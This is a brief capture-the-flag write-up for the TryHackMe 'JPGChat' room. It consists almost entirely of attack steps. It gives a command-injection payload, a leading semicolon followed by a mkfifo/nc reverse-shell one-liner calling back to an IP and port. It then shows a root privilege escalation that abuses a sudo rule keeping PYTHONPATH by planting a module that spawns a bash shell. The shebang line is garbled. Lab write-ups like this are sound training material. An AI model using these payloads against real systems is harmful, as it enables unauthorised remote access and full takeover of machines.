
## TryHackMe: JPGChat

#### Scan
- Refer to `nmap/initial*`

#### Access to
- nc EXPORT_IP PORT
  -  input command `[REPORT]`

#### Reverse Shell Payload
```
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.26.67 1234 >/tmp/f;
```

#### Privilige Escalate
```
$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```
- Methodology
	- cd /tmp
	- export PYTHONPATH=$PWD
	- touch `compare.py`
		```python
		#!/usr/env/bin pythno3
		import os
		os.system("/bin/bash")
		```
	- sudo /usr/bin/python3 /opt/development/test_module.py

#### Resource
- https://medium.com/python-features/what-happens-behind-the-scenes-when-we-import-a-module-in-python-2775da153790
